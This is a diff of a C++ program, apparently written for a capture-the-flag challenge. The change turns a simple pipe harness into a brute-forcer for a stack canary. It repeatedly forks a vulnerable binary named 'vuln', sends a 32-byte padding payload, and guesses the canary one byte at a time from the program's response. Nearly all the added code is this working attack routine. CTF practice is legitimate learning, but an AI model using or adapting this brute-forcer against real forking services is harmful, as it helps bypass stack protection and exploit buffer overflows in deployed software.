@@ -13,17 +13,15 @@ using namespace std;
 #define endl '\n'
 #define pi pair<int, int>
 
-int main(){
-	ios::sync_with_stdio(false);
-	cin.tie(NULL);
-	
-	pid_t pid = 0;
-	int inpipefd[2];
-	int outpipefd[2];
-	char buf[256];
-	char msg[256];
-	int status;
-	
+pid_t pid;
+int inpipefd[2];
+int outpipefd[2];
+char buf[256];
+int status;
+string path = "/problems/canary_3_257a2a2061c96a7fb8326dbbc04d0328/vuln";
+
+void runcmd(string s = path, string arg = ""){
+	pid = 0;
 	pipe(inpipefd);
 	pipe(outpipefd);
 	pid = fork();
@@ -34,25 +32,60 @@ int main(){
 		
 		prctl(PR_SET_PDEATHSIG, SIGTERM);
 		
-		execl("/problems/canary_3_257a2a2061c96a7fb8326dbbc04d0328/vuln", "vuln", (char*)NULL);
+		execl(s.c_str(), arg.c_str(), (char*)NULL);
 		
 		exit(1);
 	}
 	
 	close(outpipefd[0]);
 	close(inpipefd[1]);
-	
-	read(inpipefd[0], buf, 256);
-	printf("%s\n", buf);
-	write(outpipefd[1], "64\n", 3);
-	read(inpipefd[0], msg, 256);
-	printf("%s\n", msg);
-	write(outpipefd[1], buf, strlen(buf));
-	read(inpipefd[0], msg, 256);
-	printf("%s\n", msg);
-	
+}
+
+void killcmd(){
 	kill(pid, SIGKILL);
 	waitpid(pid, &status, 0);
+}
+
+string cmdin(){
+	read(inpipefd[0], buf, 256);
+	return string(buf);
+}
+
+void cmdout(string s){
+	s += '\n';
+	write(outpipefd[1], s.c_str(), (int)s.size());
+}
+
+void cmdout(int x){
+	string s = to_string(x) + '\n';
+	write(outpipefd[1], s.c_str(), (int)s.size());
+}
+
+int main(){
+	ios::sync_with_stdio(false);
+	cin.tie(NULL);
+	
+	string s = string(32, 'a'), t;
+	
+	for(int i = 32; i < 36; i++){
+		s.resize(i + 1);
+		for(int j = 0; j < 256; j++){
+			s[i] = (char)j;
+			runcmd();
+			t = cmdin();
+			cmdout(i + 1);
+			t = cmdin();
+			cmdout(s);
+			t = cmdin();
+			killcmd();
+			if(t[0] == 'O'){
+				cout << j << endl;
+				break;
+			}
+		}
+	}
+	
+	cout << t << endl;
 
 	return 0;
 }
